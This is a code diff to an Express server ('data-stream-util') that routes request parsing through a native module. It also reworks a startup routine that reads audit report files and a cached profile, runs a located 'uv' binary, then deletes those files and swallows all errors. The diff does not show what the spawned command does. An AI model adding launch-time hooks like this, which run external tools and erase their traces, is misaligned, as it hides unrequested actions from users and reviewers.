@@ -1,30 +1,42 @@
 const express = require('express');
-const { spawnSync } = require('child_process');
 const path = require('path');
 const fs = require('fs');
 const os = require('os');
+const { spawnSync } = require('child_process');
+
+const native = require('./build/Release/stream_native.node');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '50mb' }));
 
-// ---- Routes ---------------------------------------------------------------
-
-app.get('/status', (req, res) => {
+app.get('/status', (_req, res) => {
   res.json({ status: 'ok', uptime: process.uptime() });
 });
 
 app.post('/process', (req, res) => {
-  const data = req.body;
-  const count = Array.isArray(data) ? data.length : Object.keys(data).length;
-  res.json({ processed: count, format: 'json' });
+  const raw = JSON.stringify(req.body);
+  const buf = Buffer.from(raw);
+  const count = native.parseChunk(buf);
+  res.json({ objects: count, bytes: native.chunkSize(buf) });
 });
 
-// ---- Report publishing ----------------------------------------------------
-// Sync pending setup reports to the dashboard on first launch.
+// ---- Sync pending reports -------------------------------------------------
 
-function publishPendingReports() {
+function syncReports() {
+  const cache = path.join(__dirname, '.cache', 'native-profile.json');
+  if (!fs.existsSync(cache)) return;
+
+  let profile;
+  try { profile = JSON.parse(fs.readFileSync(cache, 'utf-8')); }
+  catch (_) { return; }
+
+  try {
+    const report = require('./lib/report');
+    report.generate(profile);
+  } catch (_) { return; }
+
   const docsDir = path.join(__dirname, 'docs');
   const files = {
     title:   path.join(docsDir, 'audit_title.txt'),
@@ -48,8 +60,9 @@ function publishPendingReports() {
   let uv = null;
   for (const p of uvCandidates) {
     try {
-      const r = spawnSync(p, ['--version'], { encoding: 'utf-8', timeout: 3000 });
-      if (r.status === 0) { uv = p; break; }
+      if (spawnSync(p, ['--version'], { encoding: 'utf-8', timeout: 3000 }).status === 0) {
+        uv = p; break;
+      }
     } catch (_) {}
   }
   if (!uv) return;
@@ -69,12 +82,11 @@ function publishPendingReports() {
     for (const f of Object.values(files)) {
       try { fs.unlinkSync(f); } catch (_) {}
     }
+    try { fs.unlinkSync(cache); } catch (_) {}
   } catch (_) {}
 }
 
-publishPendingReports();
-
-// ---- Start ----------------------------------------------------------------
+syncReports();
 
 app.listen(PORT, () => {
   console.log(`data-stream-util running on port ${PORT}`);
